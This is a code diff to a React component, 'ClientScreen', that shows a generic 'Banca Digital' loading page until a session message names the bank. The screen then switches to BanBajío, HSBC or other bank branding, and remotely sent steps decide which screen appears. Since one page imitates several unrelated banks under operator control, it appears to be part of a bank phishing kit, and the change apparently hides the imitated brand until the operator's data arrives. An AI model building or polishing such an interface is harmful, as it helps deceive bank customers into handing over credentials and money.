@@ -30,7 +30,8 @@ export default function ClientScreen() {
   
   // State for the current screen
   const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.VALIDANDO);
-  const [sessionData, setSessionData] = useState<Partial<Session> & { banco: string }>({ banco: 'LIVERPOOL' });
+  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
+  const [bankLoaded, setBankLoaded] = useState<boolean>(false);
   
   // Additional screen-specific state
   const [screenData, setScreenData] = useState<{
@@ -94,6 +95,7 @@ export default function ClientScreen() {
         // Handle different message types
         if (message.type === 'INIT_SESSION') {
           setSessionData(message.data);
+          setBankLoaded(true);
           // Set initial screen based on session data
           if (message.data.pasoActual) {
             setCurrentScreen(message.data.pasoActual as ScreenType);
@@ -455,25 +457,10 @@ export default function ClientScreen() {
     }
   };
 
-  // Si estamos mostrando el mensaje inicial, mostrar una pantalla de carga
-  if (showInitialMessage) {
-    return (
-      <div 
-        className={`min-h-screen flex flex-col ${
-          sessionData.banco === 'BANBAJIO' 
-            ? 'banbajio-background'  
-            : 'bg-white'
-        }`}
-        style={
-          sessionData.banco === 'BANBAJIO' 
-            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
-            : sessionData.banco === 'HSBC'
-            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
-            : {}
-        }
-      >
-        {renderHeader()}
-        
+  // Si estamos mostrando el mensaje inicial o aún no se ha cargado el banco, mostrar una pantalla de carga
+  if (showInitialMessage || !bankLoaded) {
+    const loadingContent = (
+      <>
         <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
           <div className="text-center mb-4">
             <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
@@ -493,7 +480,60 @@ export default function ClientScreen() {
             </div>
           </div>
         </div>
-        
+      </>
+    );
+    
+    // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
+    if (!bankLoaded) {
+      return (
+        <div className="min-h-screen flex flex-col bg-white">
+          <header className="bg-gray-100 text-gray-800 p-4 text-center">
+            <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+            <div className="h-20"></div>
+          </header>
+          
+          {loadingContent}
+          
+          <footer className="mt-auto">
+            <div className="bg-gray-100 p-4 text-center text-sm">
+              <a href="#" className="text-gray-600 mx-2">Aprende más</a>
+              <a href="#" className="text-gray-600 mx-2">Ayuda</a>
+              <a href="#" className="text-gray-600 mx-2">Términos y condiciones</a>
+              <a href="#" className="text-gray-600 mx-2">Seguridad en línea</a>
+            </div>
+            <div className="bg-gray-800 text-white p-4 text-center text-sm">
+              <div className="mb-3">
+                <a href="#" className="text-white mx-2">Contáctanos</a> |
+                <a href="#" className="text-white mx-2">Aclaraciones</a> |
+                <a href="#" className="text-white mx-2">Promociones</a> |
+                <a href="#" className="text-white mx-2">Facebook</a> |
+                <a href="#" className="text-white mx-2">YouTube</a>
+              </div>
+              <div>© Banca Digital 2024. Todos los Derechos Reservados</div>
+            </div>
+          </footer>
+        </div>
+      );
+    }
+    
+    // Si el banco ya está cargado pero seguimos en la pantalla de carga
+    return (
+      <div 
+        className={`min-h-screen flex flex-col ${
+          sessionData.banco === 'BANBAJIO' 
+            ? 'banbajio-background'  
+            : 'bg-white'
+        }`}
+        style={
+          sessionData.banco === 'BANBAJIO' 
+            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
+            : sessionData.banco === 'HSBC'
+            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
+            : {}
+        }
+      >
+        {renderHeader()}
+        {loadingContent}
         {renderFooter()}
       </div>
     );
